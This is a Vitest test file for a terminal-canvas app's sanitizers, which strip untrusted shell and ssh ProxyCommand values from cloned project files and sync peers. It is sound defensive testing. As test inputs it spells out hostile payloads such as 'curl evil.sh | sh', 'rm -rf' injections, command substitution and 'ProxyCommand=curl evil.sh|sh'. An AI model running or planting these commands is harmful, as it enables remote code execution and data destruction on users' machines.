import { describe, it, expect } from 'vitest'
import type { CanvasNodeState } from './types'
import {
  applyLocalNodeExec,
  localNodeExec,
  safeSessionProgram,
  sanitizeInboundMutation,
  sanitizeInboundNode,
  stripSharedNodeExec
} from './node-exec'

const node = (over: Partial<CanvasNodeState> = {}): CanvasNodeState => ({
  id: 'term-abc',
  kind: 'terminal',
  position: { x: 0, y: 0 },
  size: { width: 400, height: 300 },
  title: 't',
  color: '#fff',
  group: null,
  ...over
})

describe('safeSessionProgram', () => {
  it('accepts a plain program or an absolute path', () => {
    expect(safeSessionProgram('bash')).toBe('bash')
    expect(safeSessionProgram('/bin/zsh')).toBe('/bin/zsh')
    expect(safeSessionProgram('/usr/local/bin/fish')).toBe('/usr/local/bin/fish')
    expect(safeSessionProgram('ssh')).toBe('ssh')
    expect(safeSessionProgram('  /bin/zsh  ')).toBe('/bin/zsh')
  })

  it('refuses anything a shell would interpret — tmux runs a lone command through a shell', () => {
    // Exactly the payloads a cloned .nodeterm/project.json could ship.
    expect(safeSessionProgram('curl evil.sh | sh')).toBeUndefined()
    expect(safeSessionProgram('/bin/sh -c "curl evil.sh|sh"')).toBeUndefined()
    expect(safeSessionProgram('bash; rm -rf ~')).toBeUndefined()
    expect(safeSessionProgram('bash && whoami')).toBeUndefined()
    expect(safeSessionProgram('$(id)')).toBeUndefined()
    expect(safeSessionProgram('`id`')).toBeUndefined()
    expect(safeSessionProgram('bash\nrm -rf /')).toBeUndefined()
    expect(safeSessionProgram('bash > /tmp/x')).toBeUndefined()
  })

  it('refuses an option-looking program (tmux would read it as a flag) and empty values', () => {
    expect(safeSessionProgram('-c')).toBeUndefined()
    expect(safeSessionProgram('')).toBeUndefined()
    expect(safeSessionProgram('   ')).toBeUndefined()
    expect(safeSessionProgram(undefined)).toBeUndefined()
  })
})

describe('stripSharedNodeExec', () => {
  it('removes shell and ssh.extraArgs before a project file is written', () => {
    const [n] = stripSharedNodeExec([
      node({
        shell: '/bin/zsh',
        ssh: { host: 'h', user: 'u', port: 2222, identityFile: '~/.ssh/id', extraArgs: '-o ProxyCommand=evil' }
      })
    ])
    expect(n.shell).toBeUndefined()
    expect(n.ssh?.extraArgs).toBeUndefined()
    // The rest of the connection must survive — a node has to reattach to its host.
    expect(n.ssh).toEqual({ host: 'h', user: 'u', port: 2222, identityFile: '~/.ssh/id' })
    expect(JSON.stringify(n)).not.toContain('ProxyCommand')
  })

  it('leaves nodes with no exec fields untouched (same object)', () => {
    const nodes = [node({ cwd: '/a' })]
    expect(stripSharedNodeExec(nodes)[0]).toBe(nodes[0])
  })
})

describe('localNodeExec / applyLocalNodeExec', () => {
  it("round-trips the local user's own custom shell and ssh args through the machine-local index", () => {
    const live = [
      node({ id: 'n1', shell: '/bin/zsh' }),
      node({ id: 'n2', ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=corp-proxy %h', execTrusted: true } })
    ]
    const local = localNodeExec(live)
    expect(local).toEqual({
      n1: { shell: '/bin/zsh' },
      n2: { sshExtraArgs: '-o ProxyCommand=corp-proxy %h' }
    })
    // What the SHARED file carries (nothing) …
    const onDisk = stripSharedNodeExec(live)
    // … re-hydrated with what THIS machine typed → the user's setup still works after a restart.
    const back = applyLocalNodeExec(onDisk, local)
    expect(back[0].shell).toBe('/bin/zsh')
    expect(back[1].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
  })

  it('no overlay → the values in the FILE are dropped, not adopted (cloned/hostile project.json)', () => {
    const hostile = [
      node({ id: 'n1', shell: 'curl evil.sh | sh' }),
      node({ id: 'n2', ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=curl evil.sh|sh' } })
    ]
    const loaded = applyLocalNodeExec(hostile, undefined)
    expect(loaded[0].shell).toBeUndefined()
    expect(loaded[1].ssh?.extraArgs).toBeUndefined()
    expect(loaded[1].ssh?.host).toBe('h') // the connection itself still persists
  })

  it('an overlay for OTHER nodes cannot vouch for a hostile value on this one', () => {
    const hostile = [node({ id: 'n1', shell: 'evil.sh' })]
    const loaded = applyLocalNodeExec(hostile, { n2: { shell: '/bin/zsh' } })
    expect(loaded[0].shell).toBeUndefined()
  })

  it('a foreign file that reuses a local node id still only gets the LOCAL value', () => {
    const hostile = [node({ id: 'n1', shell: 'evil.sh' })]
    const loaded = applyLocalNodeExec(hostile, { n1: { shell: '/bin/zsh' } })
    expect(loaded[0].shell).toBe('/bin/zsh')
  })

  it('returns undefined when there is nothing machine-local to keep', () => {
    expect(localNodeExec([node()])).toBeUndefined()
  })
})

// C2: the disk boundary was worthless on its own. A canvas-sync peer's mutation is applied
// VERBATIM (isCanvasMutation validates only id/position/size), and the next save harvests whatever
// is now in the live nodes into workspace.json — the MACHINE-LOCAL, "trusted" store — from which it
// is re-attached on every load, for ever: the peer can leave, be revoked, the app can restart, and
// their `shell` / `-o ProxyCommand=…` still runs. So the wire is a trust boundary too.
describe('sanitizeInboundNode / sanitizeInboundMutation (canvas-sync peers)', () => {
  it('drops shell and ssh.extraArgs from a peer node, keeping everything else', () => {
    const peer = node({
      id: 'n1',
      title: 'theirs',
      shell: 'curl evil.sh | sh',
      ssh: { host: 'h', user: 'u', port: 2222, extraArgs: '-o ProxyCommand=curl evil.sh|sh' }
    })
    const clean = sanitizeInboundNode(peer)
    expect(clean.shell).toBeUndefined()
    expect(clean.ssh?.extraArgs).toBeUndefined()
    expect(clean.ssh?.host).toBe('h')
    expect(clean.ssh?.port).toBe(2222)
    expect(clean.title).toBe('theirs')
  })

  it('a peer cannot forge the provenance marker itself', () => {
    const peer = node({
      ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=evil', execTrusted: true }
    })
    const clean = sanitizeInboundNode(peer)
    expect(clean.ssh?.extraArgs).toBeUndefined()
    expect(clean.ssh?.execTrusted).toBeUndefined()
  })

  it('sanitizes an upsert mutation and preserves its stamps; a remove passes through', () => {
    const m = {
      op: 'upsert' as const,
      node: node({ id: 'n1', shell: 'evil.sh' }),
      src: 'cv-abc',
      seq: 7
    }
    const clean = sanitizeInboundMutation(m)
    expect(clean.node.shell).toBeUndefined()
    expect(clean.src).toBe('cv-abc')
    expect(clean.seq).toBe(7)
    const rm = { op: 'remove' as const, id: 'n1' }
    expect(sanitizeInboundMutation(rm)).toBe(rm)
  })

  it('leaves a clean node alone by reference (no needless re-render / re-publish)', () => {
    const clean = node({ id: 'n1' })
    expect(sanitizeInboundNode(clean)).toBe(clean)
  })
})

// The provenance rule for the trusted store: an exec-enabling value gets in only if a LOCAL
// producer set it. (The inbound strip above is the primary guard; this is the one that decides what
// may be BLESSED as this machine's own, so it must not take a laundered value's word for it.)
describe('localNodeExec provenance', () => {
  it('stores an exec-enabling ssh value only when it is execTrusted', () => {
    const laundered = node({
      id: 'n1',
      ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=curl evil.sh|sh' }
    })
    expect(localNodeExec([laundered])).toBeUndefined()

    const mine = node({
      id: 'n1',
      ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=corp-proxy %h', execTrusted: true }
    })
    expect(localNodeExec([mine])).toEqual({
      n1: { sshExtraArgs: '-o ProxyCommand=corp-proxy %h' }
    })
  })

  it('stores harmless ssh args regardless of provenance (nothing legitimate is lost)', () => {
    const n = node({ id: 'n1', ssh: { host: 'h', user: 'u', extraArgs: '-A -J jump.example' } })
    expect(localNodeExec([n])).toEqual({ n1: { sshExtraArgs: '-A -J jump.example' } })
  })

  it('never blesses a shell the exec site would refuse anyway', () => {
    expect(localNodeExec([node({ id: 'n1', shell: 'curl evil.sh | sh' })])).toBeUndefined()
    expect(localNodeExec([node({ id: 'n1', shell: '/bin/zsh' })])).toEqual({
      n1: { shell: '/bin/zsh' }
    })
  })

  it('applyLocalNodeExec marks what it re-attaches as this machine\'s own', () => {
    const loaded = applyLocalNodeExec(
      [node({ id: 'n1', ssh: { host: 'h', user: 'u' } })],
      { n1: { sshExtraArgs: '-o ProxyCommand=corp-proxy %h' } }
    )
    expect(loaded[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
    expect(loaded[0].ssh?.execTrusted).toBe(true) // → the exec site honors it
  })
})
